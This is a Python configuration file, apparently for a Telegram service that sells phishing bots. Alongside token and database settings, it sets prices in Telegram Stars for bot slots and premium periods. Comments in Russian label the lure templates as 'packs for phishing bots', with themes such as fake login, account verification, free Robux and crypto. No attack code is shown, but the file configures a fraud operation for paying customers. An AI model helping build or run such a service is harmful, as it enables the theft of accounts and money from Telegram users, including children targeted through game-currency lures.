import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
FERNET_KEY = os.getenv("FERNET_KEY", "")
DATABASE_URL = os.getenv("DATABASE_URL", "")

ADMIN_IDS = {8517129681}
FREE_BOTS = 3

# Прейскурант
SLOT_PRICE = 79  # Звезд за 1 бота
PREM_1D = 19
PREM_3D = 50
PREM_14D = 250

# Паки для фишинговых ботов
BASIC_PACK = ["Стандартный вход", "Проверка аккаунта"]
PREMIUM_PACKS = ["Секретный чат", "Блогер", "Бесплатные робуксы", "Premium TG", "Стикеры", "Крипта"]
